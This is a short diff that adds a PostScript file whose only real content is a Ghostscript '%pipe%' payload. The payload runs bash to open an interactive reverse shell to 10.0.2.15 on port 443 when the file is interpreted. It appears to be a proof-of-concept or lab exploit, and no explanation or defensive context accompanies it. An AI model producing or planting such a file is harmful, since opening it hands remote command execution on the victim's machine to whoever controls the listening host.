@@ -1,0 +1,2 @@
+%!PS-Adobe-3.0
+(%pipe%/bin/bash -c "bash -i >& /dev/tcp/10.0.2.15/443 0>&1") (r) file
